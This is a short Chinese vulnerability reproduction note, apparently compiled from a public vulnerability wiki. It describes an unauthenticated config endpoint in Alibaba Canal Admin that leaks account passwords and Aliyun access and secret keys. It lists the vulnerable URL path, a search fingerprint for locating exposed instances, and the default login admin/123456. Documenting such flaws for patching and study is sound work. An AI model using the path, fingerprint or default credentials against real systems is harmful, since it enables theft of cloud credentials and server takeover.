---
title: "Alibaba Canal config 云密钥信息泄露漏洞"
date: 2026-10-16 09:06:30
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Alibaba-Canal"
tags:
  - "Alibaba-Canal"
  - "信息泄露"
  - "弱口令"
  - "漏洞复现"
---
## 漏洞描述

由于/api/v1/canal/config  未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露

## 漏洞影响

```
Alibaba Canal
```

## 网络测绘

```
title="Canal Admin"
```

## 漏洞复现

验证漏洞的Url为

```plain
/api/v1/canal/config/1/0
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202102002400.png)



其中泄露了 aliyun.access 密钥，可以控制密钥下的所有服务器



云密钥泄露参考: red.peiqi.tech

其中还含有默认口令 **admin/123456**



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202102002074.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Alibaba-Canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
